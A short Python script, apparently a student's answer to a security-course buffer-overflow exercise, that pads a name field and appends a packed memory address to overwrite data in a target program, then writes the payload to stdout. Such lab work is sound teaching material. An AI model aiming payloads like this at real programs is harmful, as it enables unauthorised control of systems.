import sys
from struct import pack
# from shellcode import shellcode

# Implement your attack here!
name = b'u0578264' + b'A' * 6  # pad the name with A's to fill the buffer
payload = name + pack("<I", 0x804a020) + b'A' * 4 + \
    b'A+'  # construct the payload
print(payload)

# Launch the attack!
sys.stdout.buffer.write(payload)
